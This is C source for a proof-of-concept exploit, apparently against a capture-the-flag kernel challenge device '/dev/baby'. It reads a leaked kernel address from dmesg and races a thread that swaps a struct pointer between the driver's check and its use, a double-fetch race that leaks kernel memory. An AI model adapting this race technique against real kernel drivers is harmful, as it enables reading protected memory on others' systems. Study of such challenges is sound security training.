//poc.c
//gcc poc.c -o poc -w -static -pthread
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <pthread.h>

unsigned long long flag_addr;
int Time = 1000;
int finish = 1;

struct v5{
    char *flag;
    size_t len;
};

//change the user_flag_addr to the kernel_flag_addr
void change_flag_addr(void *a){
    struct v5 *s = a;
    while(finish == 1){
        s->flag = flag_addr;
    }
}

int main()
{
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);
    pthread_t t1;
    char buf[201]={0};
    char m[] = "flag{AAAA_BBBB_CC_DDDD_EEEE_FFFF}";     //user_flag
    char *addr;
    int file_addr,fd,ret,id,i;
    struct v5 t;
    t.flag = m;
    t.len = 33;
    fd = open("/dev/baby",0);
    ret = ioctl(fd,0x6666);
    system("dmesg | grep flag > /tmp/sir.txt");     //get kernel_flag_addr
    file_addr = open("/tmp/sir.txt",O_RDONLY);
    id = read(file_addr,buf,200);
    close(file_addr);
    addr = strstr(buf,"Your flag is at ");
    if(addr)
        {
            addr +=16;
            flag_addr = strtoull(addr,addr+16,16);
            printf("[*]The flag_addr is at: %p\n",flag_addr);
        }
    else
    {
            printf("[*]Didn't find the flag_addr!\n");
            return 0;
    }
    pthread_create(&t1,NULL,change_flag_addr,&t);   //Malicious thread
    for(i=0;i<Time;i++){
        ret = ioctl(fd,0x1337,&t);
        t.flag = m;     //In order to pass the first inspection
    }
    finish = 0;
    pthread_join(t1,NULL);
    close(fd);
    printf("[*]The result:\n");
    system("dmesg | grep flag");
    return 0;
}
